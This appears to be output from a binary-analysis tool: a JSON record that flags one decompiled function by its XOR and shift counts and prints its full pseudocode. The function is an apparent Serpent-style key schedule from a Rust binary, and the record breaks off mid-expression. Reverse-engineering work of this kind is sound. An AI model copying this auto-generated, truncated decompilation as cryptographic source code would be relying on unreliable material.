[
    {
        "Function": "sub_140014AB0",
        "Total XOR and shift operations": 1539,
        "XOR operations": 1455,
        "Shift operations": 84,
        "Operation percentage": "73.99%",
        "Function Body": "\n__int64 __fastcall sub_140014AB0(__int64 a1, __int64 a2, __int64 a3, void *a4, size_t MaxCount, __int128 *a6)\n{\n  void *v8; // rax\n  size_t v9; // rdx\n  void *v10; // rax\n  size_t v11; // rdx\n  unsigned int *v12; // rax\n  __int64 v13; // rdx\n  unsigned int *v14; // rax\n  __int64 v15; // rdx\n  int v16; // ebx\n  unsigned int *v17; // rax\n  __int64 v18; // rdx\n  int v19; // r14d\n  unsigned int *v20; // rax\n  __int64 v21; // rdx\n  int v22; // r12d\n  unsigned int *v23; // rax\n  __int64 v24; // rdx\n  int v25; // esi\n  unsigned int *v26; // rax\n  __int64 v27; // rdx\n  int v28; // r13d\n  unsigned int *v29; // rax\n  __int64 v30; // rdx\n  int v31; // r15d\n  unsigned int *v32; // rax\n  __int64 v33; // rdx\n  int v34; // ebp\n  int v35; // r8d\n  int v36; // ebx\n  int v37; // r14d\n  int v38; // r12d\n  int v39; // r9d\n  int v40; // eax\n  int v41; // esi\n  int v42; // r13d\n  int v43; // edx\n  int v44; // ebp\n  int v45; // r10d\n  int v46; // ecx\n  int v47; // r11d\n  int v48; // r10d\n  int v49; // r8d\n  int v50; // r9d\n  int v51; // r11d\n  int v52; // r12d\n  int v53; // ecx\n  int v54; // r10d\n  int v55; // ecx\n  int v56; // edi\n  int v57; // ebx\n  int v58; // r10d\n  int v59; // eax\n  int v60; // ebx\n  int v61; // ecx\n  int v62; // r10d\n  int v63; // esi\n  int v64; // r13d\n  int v65; // edx\n  int v66; // ebp\n  int v67; // r10d\n  int v68; // eax\n  int v69; // ecx\n  int v70; // ebx\n  int v71; // r14d\n  int v72; // ecx\n  int v73; // eax\n  int v74; // ebx\n  int v75; // r8d\n  int v76; // esi\n  int v77; // r11d\n  int v78; // r12d\n  int v79; // r9d\n  int v80; // eax\n  int v81; // edi\n  int v82; // ecx\n  int v83; // ebx\n  int v84; // r9d\n  int v85; // r10d\n  int v86; // r13d\n  int v87; // edi\n  int v88; // ebp\n  int v89; // r14d\n  int v90; // eax\n  int v91; // r15d\n  int v92; // r14d\n  int v93; // ebx\n  int v94; // r8d\n  int v95; // r10d\n  int v96; // edx\n  int v97; // r12d\n  int v98; // r11d\n  int v99; // r14d\n  int v100; // r15d\n  int v101; // r11d\n  int v102; // r15d\n  int v103; // r11d\n  int v104; // eax\n  int v105; // ebx\n  int v106; // ebp\n  int v107; // r9d\n  int v108; // r10d\n  int v109; // ecx\n  int v110; // eax\n  int v111; // edi\n  int v112; // ecx\n  int v113; // r9d\n  int v114; // esi\n  int v115; // r13d\n  int v116; // edx\n  int v117; // r14d\n  int v118; // ecx\n  int v119; // r12d\n  int v120; // esi\n  int v121; // eax\n  int v122; // r14d\n  int v123; // r15d\n  int v124; // r11d\n  int v125; // ebp\n  int v126; // ebx\n  int v127; // ecx\n  int v128; // edx\n  int v129; // ebx\n  int v130; // r12d\n  int v131; // r8d\n  int v132; // esi\n  int v133; // r13d\n  int v134; // ecx\n  int v135; // edi\n  int v136; // ecx\n  int v137; // edx\n  int v138; // r10d\n  int v139; // edi\n  int v140; // eax\n  int v141; // r10d\n  int v142; // ecx\n  int v143; // edi\n  int v144; // r14d\n  int v145; // r15d\n  int v146; // r11d\n  int v147; // ebp\n  int v148; // r10d\n  int v149; // eax\n  int v150; // edi\n  int v151; // ecx\n  int v152; // edx\n  int v153; // r9d\n  int v154; // ecx\n  int v155; // eax\n  int v156; // edx\n  int v157; // r12d\n  int v158; // r14d\n  int v159; // esi\n  int v160; // r13d\n  int v161; // r8d\n  int v162; // eax\n  int v163; // edx\n  int v164; // ecx\n  int v165; // r9d\n  int v166; // r8d\n  int v167; // r10d\n  int v168; // r8d\n  int v169; // edi\n  int v170; // ebp\n  int v171; // r13d\n  int v172; // ecx\n  int v173; // eax\n  int v174; // r12d\n  int v175; // r10d\n  int v176; // r11d\n  int v177; // edx\n  int v178; // r9d\n  int v179; // r14d\n  int v180; // r13d\n  int v181; // esi\n  int v182; // ebp\n  int v183; // r12d\n  int v184; // r10d\n  int v185; // edi\n  int v186; // r11d\n  int v187; // r9d\n  int v188; // ecx\n  int v189; // r13d\n  int v190; // r14d\n  int v191; // ebx\n  int v192; // eax\n  int v193; // r15d\n  int v194; // r12d\n  int v195; // r10d\n  int v196; // ecx\n  int v197; // eax\n  int v198; // r15d\n  int v199; // edi\n  int v200; // r11d\n  int v201; // ebp\n  int v202; // eax\n  int v203; // edx\n  int v204; // r8d\n  int v205; // eax\n  int v206; // r12d\n  int v207; // ebx\n  int v208; // esi\n  int v209; // r13d\n  int v210; // ecx\n  int v211; // edx\n  int v212; // ecx\n  int v213; // r8d\n  int v214; // r9d\n  int v215; // edx\n  int v216; // eax\n  int v217; // r9d\n  int v218; // ecx\n  int v219; // edx\n  int v220; // r15d\n  int v221; // edi\n  int v222; // r11d\n  int v223; // ebp\n  int v224; // edx\n  int v225; // eax\n  int v226; // ecx\n  int v227; // r9d\n  int v228; // r10d\n  int v229; // ecx\n  int v230; // eax\n  int v231; // r9d\n  int v232; // r12d\n  int v233; // r15d\n  int v234; // esi\n  int v235; // r13d\n  int v236; // r10d\n  int v237; // eax\n  int v238; // r8d\n  int v239; // ecx\n  int v240; // ebx\n  int v241; // r10d\n  int v242; // edx\n  int v243; // edi\n  int v244; // r9d\n  int v245; // ebp\n  int v246; // r10d\n  int v247; // r14d\n  int v248; // eax\n  int v249; // r11d\n  int v250; // r14d\n  int v251; // ebx\n  int v252; // r12d\n  int v253; // edx\n  int v254; // r11d\n  int v255; // r13d\n  int v256; // esi\n  int v257; // ebx\n  int v258; // r15d\n  int v259; // esi\n  int v260; // r15d\n  int v261; // r10d\n  int v262; // edi\n  int v263; // r8d\n  int v264; // ebp\n  int v265; // esi\n  int v266; // ebp\n  int v267; // eax\n  int v268; // ebp\n  int v269; // ecx\n  int v270; // ebx\n  int v271; // eax\n  int v272; // edi\n  int v273; // eax\n  int v274; // ebx\n  int v275; // r12d\n  int v276; // r10d\n  int v277; // esi\n  int v278; // r8d\n  int v279; // eax\n  int v280; // r8d\n  int v281; // r10d\n  int v282; // r12d\n  int v283; // esi\n  int v284; // ecx\n  int v285; // eax\n  int v286; // r10d\n  unsigned int *v287; // rax\n  __int64 v288; // rdx\n  int v289; // ebp\n  unsigned int *v290; // rax\n  __int64 v291; // rdx\n  int v292; // ebx\n  unsigned int *v293; // rax\n  __int64 v294; // rdx\n  int v295; // esi\n  unsigned int *v296; // rax\n  __int64 v297; // rdx\n  int v298; // eax\n  int v299; // ebp\n  int v300; // ebx\n  int v301; // esi\n  int v302; // eax\n  int v303; // ecx\n  int v304; // edx\n  int v305; // ebx\n  int v306; // edx\n  int v307; // eax\n  int v308; // ebx\n  int v309; // ecx\n  int v310; // esi\n  int v311; // ebx\n  int v312; // edx\n  int v313; // ecx\n  int v314; // edx\n  int v315; // esi\n  int v316; // ecx\n  int v317; // eax\n  int v318; // edx\n  int v319; // r8d\n  int v320; // ecx\n  int v321; // eax\n  int v322; // edx\n  int v323; // r8d\n  int v324; // r9d\n  int v325; // eax\n  int v326; // ecx\n  int v327; // r9d\n  int v328; // edx\n  int v329; // ecx\n  int v330; // r8d\n  int v331; // r9d\n  int v332; // eax\n  int v333; // ecx\n  int v334; // r9d\n  int v335; // r8d\n  int v336; // edx\n  int v337; // ecx\n  int v338; // eax\n  int v339; // r8d\n  int v340; // edx\n  int v341; // eax\n  int v342; // ecx\n  int v343; // r10d\n  int v344; // eax\n  int v345; // ecx\n  int v346; // r8d\n  int v347; // edx\n  int v348; // r10d\n  int v349; // eax\n  int v350; // ecx\n  int v351; // edx\n  int v352; // r9d\n  int v353; // r8d\n  int v354; // eax\n  int v355; // edx\n  int v356; // r8d\n  int v357; // r9d\n  int v358; // r11d\n  int v359; // r9d\n  int v360; // edx\n  int v361; // eax\n  int v362; // r8d\n  int v363; // r10d\n  int v364; // r11d\n  int v365; // edx\n  int v366; // ecx\n  int v367; // r10d\n  int v368; // edx\n  int v369; // eax\n  int v370; // ecx\n  int v371; // r9d\n  int v372; // edx\n  int v373; // eax\n  int v374; // r8d\n  int v375; // eax\n  int v376; // r9d\n  int v377; // ecx\n  int v378; // eax\n  int v379; // r8d\n  int v380; // r10d\n  int v381; // r9d\n  int v382; // edx\n  int v383; // r9d\n  int v384; // r10d\n  int v385; // r11d\n  int v386; // r8d\n  int v387; // eax\n  int v388; // ecx\n  int v389; // r8d\n  int v390; // edx\n  int v391; // eax\n  int v392; // ecx\n  int v393; // r8d\n  int v394; // edx\n  int v395; // eax\n  int v396; // r10d\n  int v397; // edx\n  int v398; // ecx\n  int v399; // r9d\n  int v400; // ecx\n  int v401; // edx\n  int v402; // r8d\n  int v403; // r10d\n  int v404; // r8d\n  int v405; // r9d\n  int v406; // r10d\n  int v407; // edx\n  int v408; // ecx\n  int v409; // r9d\n  int v410; // r8d\n  int v411; // ecx\n  int v412; // r10d\n  int v413; // r9d\n  int v414; // r11d\n  int v415; // edx\n  int v416; // esi\n  int v417; // r9d\n  int v418; // esi\n  int v419; // eax\n  int v420; // r11d\n  int v421; // esi\n  int v422; // eax\n  int v423; // r11d\n  int v424; // edx\n  int v425; // r10d\n  int v426; // r8d\n  int v427; // eax\n  int v428; // edx\n  int v429; // r8d\n  int v430; // r10d\n  int v431; // r11d\n  int v432; // ecx\n  int v433; // r9d\n  int v434; // r8d\n  int v435; // r11d\n  int v436; // eax\n  int v437; // r11d\n  int v438; // ecx\n  int v439; // r11d\n  int v440; // r8d\n  int v441; // eax\n  int v442; // r9d\n  int v443; // ecx\n  int v444; // r8d\n  int v445; // r9d\n  int v446; // eax\n  int v447; // edx\n  int v448; // r10d\n  int v449; // r8d\n  int v450; // r10d\n  int v451; // eax\n  int v452; // r8d\n  int v453; // edx\n  int v454; // ecx\n  int v455; // edx\n  int v456; // r9d\n  int v457; // ecx\n  int v458; // eax\n  int v459; // edx\n  int v460; // r8d\n  int v461; // ecx\n  int v462; // eax\n  int v463; // edx\n  int v464; // r8d\n  int v465; // r9d\n  int v466; // eax\n  int v467; // ecx\n  int v468; // r9d\n  int v469; // edx\n  int v470; // ecx\n  int v471; // r8d\n  int v472; // r9d\n  int v473; // eax\n  int v474; // ecx\n  int v475; // r9d\n  int v476; // r8d\n  int v477; // edx\n  int v478; // ecx\n  int v479; // eax\n  int v480; // r8d\n  int v481; // edx\n  int v482; // eax\n  int v483; // ecx\n  int v484; // r10d\n  int v485; // eax\n  int v486; // ecx\n  int v487; // r8d\n  int v488; // edx\n  int v489; // r10d\n  int v490; // eax\n  int v491; // ecx\n  int v492; // edx\n  int v493; // r9d\n  int v494; // r8d\n  int v495; // eax\n  int v496; // edx\n  int v497; // r8d\n  int v498; // r9d\n  int v499; // r10d\n  int v500; // r9d\n  int v501; // edx\n  int v502; // eax\n  int v503; // r8d\n  int v504; // ecx\n  int v505; // r10d\n  int v506; // edx\n  int v507; // r9d\n  int v508; // ecx\n  int v509; // edx\n  int v510; // eax\n  int v511; // edx\n  int v512; // eax\n  int v513; // ecx\n  int v514; // eax\n  int v515; // r10d\n  int v516; // eax\n  int v517; // r8d\n  int v518; // ecx\n  int v519; // r9d\n  int v520; // r10d\n  int v521; // edx\n  int v522; // r10d\n  int v523; // r9d\n  int v524; // r11d\n  int v525; // ecx\n  int v526; // r8d\n  int v527; // eax\n  int v528; // ecx\n  int v529; // edx\n  int v530; // r8d\n  int v531; // eax\n  int v532; // ecx\n  int v533; // edx\n  int v534; // r8d\n  int v535; // r10d\n  int v536; // edx\n  int v537; // eax\n  int v538; // r9d\n  int v539; // eax\n  int v540; // edx\n  int v541; // ecx\n  int v542; // r10d\n  int v543; // ecx\n  int v544; // r9d\n  int v545; // r10d\n  int v546; // edx\n  int v547; // eax\n  int v548; // r9d\n  int v549; // r8d\n  int v550; // eax\n  int v551; // r10d\n  int v552; // r9d\n  int v553; // r11d\n  int v554; // edx\n  int v555; // esi\n  int v556; // r9d\n  int v557; // esi\n  int v558; // ecx\n  int v559; // r11d\n  int v560; // esi\n  int v561; // ecx\n  int v562; // r11d\n  int v563; // edx\n  int v564; // r10d\n  int v565; // r8d\n  int v566; // ecx\n  int v567; // edx\n  int v568; // r8d\n  int v569; // r10d\n  int v570; // r11d\n  int v571; // eax\n  int v572; // r9d\n  int v573; // r8d\n  int v574; // r11d\n  int v575; // ecx\n  int v576; // r11d\n  int v577; // eax\n  int v578; // r11d\n  int v579; // r8d\n  int v580; // ecx\n  int v581; // r9d\n  int v582; // eax\n  int v583; // r8d\n  int v584; // r9d\n  int v585; // ecx\n  int v586; // edx\n  int v587; // r10d\n  int v588; // r8d\n  int v589; // r10d\n  int v590; // ecx\n  int v591; // r8d\n  int v592; // edx\n  int v593; // eax\n  int v594; // edx\n  int v595; // r9d\n  int v596; // eax\n  int v597; // ecx\n  int v598; // edx\n  int v599; // r8d\n  int v600; // eax\n  int v601; // ecx\n  int v602; // edx\n  int v603; // r8d\n  int v604; // r9d\n  int v605; // ecx\n  int v606; // eax\n  int v607; // r9d\n  int v608; // edx\n  int v609; // eax\n  int v610; // r8d\n  int v611; // r9d\n  int v612; // ecx\n  int v613; // eax\n  int v614; // r9d\n  int v615; // r8d\n  int v616; // edx\n  int v617; // eax\n  int v618; // edx\n  int v619; // eax\n  int v620; // r10d\n  int v621; // ecx\n  int v622; // eax\n  int v623; // r8d\n  int v624; // edx\n  int v625; // r10d\n  int v626; // ecx\n  int v627; // eax\n  int v628; // edx\n  int v629; // r9d\n  int v630; // r8d\n  int v631; // ecx\n  int v632; // edx\n  int v633; // r8d\n  int v634; // r9d\n  int v635; // r10d\n  int v636; // r9d\n  int v637; // edx\n  int v638; // ecx\n  int v639; // r8d\n  int v640; // r11d\n  int v641; // r10d\n  int v642; // edx\n  int v643; // eax\n  int v644; // r11d\n  int v645; // edx\n  int v646; // ecx\n  int v647; // eax\n  int v648; // r10d\n  int v649; // edx\n  int v650; // ecx\n  int v651; // r8d\n  int v652; // ecx\n  int v653; // r10d\n  int v654; // eax\n  int v655; // r9d\n  int v656; // r8d\n  int v657; // ecx\n  int v658; // r10d\n  int v659; // edx\n  int v660; // r10d\n  int v661; // ecx\n  int v662; // r11d\n  int v663; // r8d\n  int v664; // r9d\n  int v665; // eax\n  int v666; // r8d\n  int v667; // ecx\n  int v668; // r9d\n  int v669; // eax\n  int v670; // r8d\n  int v671; // ecx\n  int v672; // r9d\n  int v673; // edx\n  int v674; // ecx\n  int v675; // eax\n  int v676; // r10d\n  int v677; // eax\n  int v678; // ecx\n  int v679; // r8d\n  int v680; // edx\n  int v681; // r8d\n  int v682; // r10d\n  int v683; // edx\n  int v684; // ecx\n  int v685; // eax\n  int v686; // r10d\n  int v687; // r9d\n  int v688; // eax\n  int v689; // r8d\n  int v690; // r10d\n  int v691; // r11d\n  int v692; // ecx\n  int v693; // esi\n  int v694; // r10d\n  int v695; // esi\n  int v696; // edx\n  int v697; // r11d\n  int v698; // edx\n  int v699; // esi\n  int v700; // r11d\n  int v701; // ecx\n  int v702; // r8d\n  int v703; // eax\n  int v704; // edx\n  int v705; // ecx\n  int v706; // eax\n  int v707; // r8d\n  int v708; // r10d\n  int v709; // r9d\n  int v710; // eax\n  int v711; // r8d\n  int v712; // eax\n  int v713; // r10d\n  int v714; // edx\n  int v715; // r10d\n  int v716; // r9d\n  int v717; // r10d\n  int v718; // eax\n  int v719; // edx\n  __int64 v720; // rdi\n  __int64 v721; // r14\n  unsigned __int64 v722; // rdi\n  __int64 v723; // r14\n  __int64 v724; // rdx\n  __int64 v725; // rbx\n  __int64 v726; // rdx\n  __int64 v727; // r8\n  char v728; // dl\n  __int64 v729; // rcx\n  int v730; // r15d\n  int v731; // r10d\n  unsigned int v732; // esi\n  int v733; // r9d\n  int v734; // r11d\n  int v735; // r15d\n  int v736; // r11d\n  int v737; // r10d\n  int v738; // edi\n  int v739; // r15d\n  unsigned __int64 v740; // r14\n  int v741; // edi\n  int v742; // r11d\n  int v743; // ebp\n  int v744; // r15d\n  unsigned __int64 v745; // rax\n  int v746; // ebp\n  int v747; // edi\n  int v748; // ebx\n  int v749; // edi\n  int v750; // r11d\n  int v751; // r9d\n  int v752; // r10d\n  int v753; // ebx\n  int v754; // r13d\n  unsigned __int64 v755; // rdi\n  int v756; // esi\n  unsigned __int64 v757; // rbx\n  __int64 v758; // rax\n  __int64 v759; // rdx\n  int v760; // ecx\n  int v761; // r15d\n  unsigned __int64 v762; // r13\n  int v763; // esi\n  int v764; // edx\n  int v765; // r15d\n  unsigned __int64 v766; // rbp\n  int v767; // ecx\n  int v768; // r8d\n  int v769; // r15d\n  unsigned __int64 v770; // r11\n  int v771; // edx\n  int v772; // r15d\n  int v773; // r8d\n  int v774; // r9d\n  int v775; // edx\n  int v776; // r8d\n  int v777; // esi\n  int v778; // ecx\n  int v779; // r9d\n  int v780; // esi\n  __int64 v781; // rax\n  __int64 v782; // rdx\n  int v783; // ecx\n  int v784; // r15d\n  unsigned __int64 v785; // r11\n  int v786; // eax\n  int v787; // edx\n  int v788; // r15d\n  unsigned __int64 v789; // rbx\n  int v790; // ecx\n  int v791; // r8d\n  int v792; // r15d\n  int v793; // edx\n  int v794; // r12d\n  int v795; // r15d\n  int v796; // r8d\n  int v797; // r9d\n  int v798; // edx\n  int v799; // r8d\n  int v800; // eax\n  int v801; // ecx\n  int v802; // r9d\n  int v803; // esi\n  __int64 v804; // rax\n  __int64 v805; // rdx\n  int v806; // ecx\n  int v807; // r15d\n  int v808; // esi\n  int v809; // edx\n  int v810; // r15d\n  unsigned int v811; // r12d\n  int v812; // ecx\n  int v813; // r8d\n  int v814; // r15d\n  __int64 v815; // rbx\n  int v816; // edx\n  int v817; // eax\n  int v818; // r15d\n  unsigned int v819; // r12d\n  int v820; // r15d\n  int v821; // r8d\n  int v822; // r9d\n  int v823; // edx\n  int v824; // r8d\n  int v825; // ecx\n  int v826; // r9d\n  int v827; // r12d\n  __int64 v828; // rax\n  __int64 v829; // rdx\n  int v830; // r15d\n  int v831; // edx\n  int v832; // r15d\n  int v833; // edx\n  int v834; // r9d\n  int v835; // r10d\n  int v836; // r15d\n  int v837; // r10d\n  int v838; // r8d\n  int v839; // r15d\n  int v840; // r8d\n  int v841; // r9d\n  int v842; // esi\n  int v843; // eax\n  int v844; // edx\n  int v845; // r8d\n  int v846; // eax\n  int v847; // r9d\n  int v848; // edx\n  __int64 v849; // rax\n  __int64 v850; // rdx\n  unsigned int v851; // eax\n  char v852; // dl\n  __int128 v853; // rax\n  __int64 v854; // rsi\n  unsigned __int64 v855; // rdx\n  unsigned __int64 v856; // rbx\n  __int64 v857; // rcx\n  __int64 v858; // rax\n  __int64 i; // rdx\n  __int64 result; // rax\n  _OWORD *v861; // rcx\n  const char *v862; // rcx\n  void **v863; // r8\n  __int64 v864; // rdx\n  int v865; // [rsp+30h] [rbp-1398h]\n  int v866; // [rsp+30h] [rbp-1398h]\n  int v867; // [rsp+30h] [rbp-1398h]\n  int v868; // [rsp+30h] [rbp-1398h]\n  int v869; // [rsp+30h] [rbp-1398h]\n  unsigned __int64 v870; // [rsp+30h] [rbp-1398h]\n  unsigned __int64 v871; // [rsp+30h] [rbp-1398h]\n  char v872; // [rsp+3Fh] [rbp-1389h]\n  int v873; // [rsp+40h] [rbp-1388h]\n  int v874; // [rsp+40h] [rbp-1388h]\n  int v875; // [rsp+40h] [rbp-1388h]\n  unsigned __int64 v876; // [rsp+40h] [rbp-1388h]\n  int v877; // [rsp+48h] [rbp-1380h]\n  int v878; // [rsp+48h] [rbp-1380h]\n  unsigned __int64 v879; // [rsp+48h] [rbp-1380h]\n  int v880; // [rsp+50h] [rbp-1378h]\n  int v881; // [rsp+50h] [rbp-1378h]\n  unsigned __int64 v882; // [rsp+50h] [rbp-1378h]\n  int v883; // [rsp+58h] [rbp-1370h]\n  unsigned __int64 v884; // [rsp+58h] [rbp-1370h]\n  int v885; // [rsp+60h] [rbp-1368h]\n  int v886; // [rsp+60h] [rbp-1368h]\n  unsigned __int64 v887; // [rsp+60h] [rbp-1368h]\n  int v888; // [rsp+68h] [rbp-1360h]\n  int v889; // [rsp+68h] [rbp-1360h]\n  unsigned __int64 v890; // [rsp+68h] [rbp-1360h]\n  unsigned __int64 v891; // [rsp+68h] [rbp-1360h]\n  int v892; // [rsp+74h] [rbp-1354h]\n  int v893; // [rsp+74h] [rbp-1354h]\n  unsigned __int64 v894; // [rsp+78h] [rbp-1350h]\n  unsigned __int64 v895; // [rsp+78h] [rbp-1350h]\n  unsigned __int64 v896; // [rsp+80h] [rbp-1348h]\n  unsigned int v897; // [rsp+88h] [rbp-1340h]\n  __int128 v898; // [rsp+90h] [rbp-1338h] BYREF\n  __int128 v899; // [rsp+A0h] [rbp-1328h]\n  char v900[24]; // [rsp+B0h] [rbp-1318h] BYREF\n  int v901[4]; // [rsp+C8h] [rbp-1300h] BYREF\n  int v902[4]; // [rsp+D8h] [rbp-12F0h] BYREF\n  int v903[4]; // [rsp+E8h] [rbp-12E0h] BYREF\n  int v904[4]; // [rsp+F8h] [rbp-12D0h] BYREF\n  __int64 v905; // [rsp+108h] [rbp-12C0h] BYREF\n  __int64 v906; // [rsp+110h] [rbp-12B8h]\n  __int64 v907; // [rsp+118h] [rbp-12B0h]\n  __int64 v908; // [rsp+120h] [rbp-12A8h]\n  unsigned __int64 v909; // [rsp+128h] [rbp-12A0h]\n  __int64 v910; // [rsp+130h] [rbp-1298h]\n  __int64 v911; // [rsp+138h] [rbp-1290h]\n  __int64 v912; // [rsp+140h] [rbp-1288h]\n  __int64 v913; // [rsp+148h] [rbp-1280h]\n  __int64 v914; // [rsp+150h] [rbp-1278h]\n  _DWORD v915[132]; // [rsp+158h] [rbp-1270h] BYREF\n  unsigned int v916; // [rsp+368h] [rbp-1060h]\n  char Dst[4096]; // [rsp+370h] [rbp-1058h] BYREF\n\n  *(_QWORD *)v900 = 1i64;\n  *(_OWORD *)&v900[8] = 0i64;\n  v905 = a2;\n  v906 = a3;\n  v907 = 0i64;\n  memset(Dst, 0, sizeof(Dst));\n  memset(v915, 0, sizeof(v915));\n  v916 = 80;\n  if ( MaxCount > 0x20 )\n  {\n    v862 = \"assertion failed: key.len() <= 32megazord\\\\src\\\\crypto.rs\";\n    v863 = &off_140064650;\n    v864 = 33i64;\nLABEL_23:\n    sub_14005CEC0((__int64)v862, v864, (__int64)v863);\n  }\n  v899 = 0i64;\n  v898 = 0i64;\n  v908 = a1;\n  if ( MaxCount == 32 )\n  {\n    v8 = (void *)sub_14000E8ED((__int64)&v898, 0x20ui64, (__int64)&off_140064F10);\n    sub_14000E90C(a4, 0x20ui64, v8, v9);\n  }\n  else\n  {\n    v10 = (void *)sub_14000E8ED((__int64)&v898, MaxCount, (__int64)&off_140064EF8);\n    sub_14000E90C(a4, MaxCount, v10, v11);\n    *((_BYTE *)&v898 + MaxCount) = 1;\n  }\n  v12 = (unsigned int *)sub_14000E944((__int64)&v898, 0i64, 4ui64, (__int64)&off_140064F28);\n  v865 = sub_140019BA1(v12, v13);\n  v14 = (unsigned int *)sub_14000E944((__int64)&v898, 4ui64, 8ui64, (__int64)&off_140064F40);\n  v16 = sub_140019BA1(v14, v15);\n  v17 = (unsigned int *)sub_14000E944((__int64)&v898, 8ui64, 0xCui64, (__int64)&off_140064F58);\n  v19 = sub_140019BA1(v17, v18);\n  v20 = (unsigned int *)sub_14000E944((__int64)&v898, 0xCui64, 0x10ui64, (__int64)&off_140064F70);\n  v22 = sub_140019BA1(v20, v21);\n  v23 = (unsigned int *)sub_14000E944((__int64)&v898, 0x10ui64, 0x14ui64, (__int64)&off_140064F88);\n  v25 = sub_140019BA1(v23, v24);\n  v26 = (unsigned int *)sub_14000E944((__int64)&v898, 0x14ui64, 0x18ui64, (__int64)&off_140064FA0);\n  v28 = sub_140019BA1(v26, v27);\n  v29 = (unsigned int *)sub_14000E944((__int64)&v898, 0x18ui64, 0x1Cui64, (__int64)&off_140064FB8);\n  v31 = sub_140019BA1(v29, v30);\n  v32 = (unsigned int *)sub_14000E944((__int64)&v898, 0x1Cui64, 0x20ui64, (__int64)&off_140064FD0);\n  v34 = sub_140019BA1(v32, v33);\n  v35 = __ROL4__(v28 ^ v865 ^ v22 ^ v34 ^ 0x9E3779B9, 11);\n  v36 = __ROL4__(v35 ^ v31 ^ v25 ^ v16 ^ 0x9E3779B8, 11);\n  v37 = __ROL4__(v36 ^ v34 ^ v28 ^ v19 ^ 0x9E3779BB, 11);\n  v38 = __ROL4__(v35 ^ v37 ^ v31 ^ v22 ^ 0x9E3779BA, 11);\n  v39 = v37 ^ v36 ^ v38;\n  v40 = v35 & v36 ^ (v35 | v38);\n  v915[0] = v40 ^ (v39 ^ (v40 | (v35 | v38) & (v36 ^ v38) ^ (v35 & v36 | v35 ^ v37) ^ v35 & v36)) & ~((v35 | v38) & (v36 ^ v38) ^ (v35 & v36 | v35 ^ v37));\n  v915[1] = v39 ^ (v40 | (v35 | v38) & (v36 ^ v38) ^ (v35 & v36 | v35 ^ v37) ^ v35 & v36);\n  v915[2] = (v35 | v38) & (v36 ^ v38) ^ (v35 & v36 | v35 ^ v37);\n  v41 = __ROL4__(v36 ^ v38 ^ v34 ^ v25 ^ 0x9E3779BD, 11);\n  v915[3] = v39 ^ (v35 ^ v37) & v40;\n  v42 = __ROL4__(v41 ^ v28 ^ v35 ^ v37 ^ 0x9E3779BC, 11);\n  v43 = __ROL4__(v42 ^ v31 ^ v36 ^ v38 ^ 0x9E3779BF, 11);\n  v44 = __ROL4__(v41 ^ v43 ^ v37 ^ v34 ^ 0x9E3779BE, 11);\n  v45 = v44 ^ v41 & v43;\n  v46 = v42 ^ (v41 | v44);\n  v915[4] = v45 ^ v42 ^ v43;\n  v47 = v45 ^ (v46 | v41 ^ v915[4]);\n  v48 = v41 ^ v915[4] ^ v46 & v45;\n  v915[5] = v47;\n  v915[6] = v47 ^ v48 ^ v46;\n  v49 = __ROL4__(v42 ^ v44 ^ v38 ^ v35 ^ 0x9E3779B1, 11);\n  v50 = __ROL4__(v49 ^ v36 ^ v41 ^ v43 ^ 0x9E3779B0, 11);\n  v915[7] = ~v48;\n  v51 = __ROL4__(v50 ^ v37 ^ v42 ^ v44 ^ 0x9E3779B3, 11);\n  v52 = __ROL4__(v51 ^ v49 ^ v43 ^ v38 ^ 0x9E3779B2, 11);\n  v53 = ~v49 & v50;\n  v54 = v53 | v52;\n  v55 = ~(v51 ^ v53);\n  v56 = v55 ^ v52;\n  v57 = v50 ^ v54;\n  v58 = ~v49 ^ v54;\n  v59 = v57 | ~v49;\n  v60 = v55 ^ v52 ^ v57;\n  v61 = v59 & (v58 | v55);\n  v62 = v60 ^ v58;\n  v915[8] = v61;\n  v915[9] = v59 ^ v61 & v62;\n  v915[10] = v56;\n  v915[11] = v62 ^ v61 & v60;\n  v63 = __ROL4__(v52 ^ v50 ^ v44 ^ v41 ^ 0x9E3779B5, 11);\n  v64 = __ROL4__(v63 ^ v51 ^ v49 ^ v42 ^ 0x9E3779B4, 11);\n  v65 = __ROL4__(v64 ^ v52 ^ v50 ^ v43 ^ 0x9E3779B7, 11);\n  v66 = __ROL4__(v65 ^ v63 ^ v51 ^ v44 ^ 0x9E3779B6, 11);\n  v67 = v63 ^ v66;\n  v68 = v63 ^ v64 & (v63 ^ v66);\n  v69 = v63 ^ v66 ^ v64 ^ v65;\n  v70 = v65 ^ v63 ^ v66;\n  v71 = v69 ^ (v65 | v68);\n  v72 = v68 | ~v69;\n  v73 = v70 ^ v68;\n  v74 = v72 ^ (v64 ^ v65 ^ (v63 | v66) | v70);\n  v915[12] = v74 ^ v73;\n  v915[13] = v74;\n  v915[14] = v71;\n  v915[15] = v64 ^ v65 ^ (v63 | v66);\n  v75 = __ROL4__(v66 ^ v64 ^ v52 ^ v49 ^ 0x9E3779A9, 11);\n  v76 = __ROL4__(v75 ^ v65 ^ v50 ^ v63 ^ 0x9E3779A8, 11);\n  v77 = __ROL4__(v76 ^ v66 ^ v64 ^ v51 ^ 0x9E3779AB, 11);\n  v78 = __ROL4__(v77 ^ v75 ^ v65 ^ v52 ^ 0x9E3779AA, 11);\n  v79 = v78 ^ (v76 | v77);\n  v80 = v77 ^ v79;\n  v81 = v76 ^ v79;\n  v82 = v79 ^ v75 & (v78 | v76 ^ v77);\n  v83 = v77 ^ v79 ^ (v75 | v76 ^ v79);\n  v84 = v76 ^ v79 ^ v75 ^ (v76 | v79);\n  v915[16] = v81 ^ (v83 | ~(v84 ^ v80));\n  v915[17] = v82;\n  v85 = __ROL4__(v76 ^ v78 ^ v67 ^ 0x9E3779AD, 11);\n  v915[18] = v81 ^ v83 & v84;\n  v86 = __ROL4__(v85 ^ v77 ^ v75 ^ v64 ^ 0x9E3779AC, 11);\n  v87 = __ROL4__(v86 ^ v65 ^ v76 ^ v78 ^ 0x9E3779AF, 11);\n  v915[19] = v80 ^ (v75 | v76 ^ v78 ^ (v76 | v77));\n  v88 = __ROL4__(v87 ^ v85 ^ v77 ^ v66 ^ 0x9E3779AE, 11);\n  v873 = v85 ^ v88;\n  v89 = ~v87 ^ v85 & v88;\n  v90 = v86 ^ v89 ^ v85 ^ v88 ^ (v88 | ~v87);\n  v91 = v90 ^ (v89 | v85 ^ v88 | v86 ^ v89);\n  v92 = v91 ^ (v85 ^ v88 | v86 ^ v89) ^ v88 ^ v89;\n  v93 = v92 & v90 ^ v87 ^ v85 & v88;\n  v915[20] = v91;\n  v915[21] = v86 ^ ~v87 ^ v85 & v88;\n  v94 = __ROL4__(v86 ^ v88 ^ v78 ^ v75 ^ 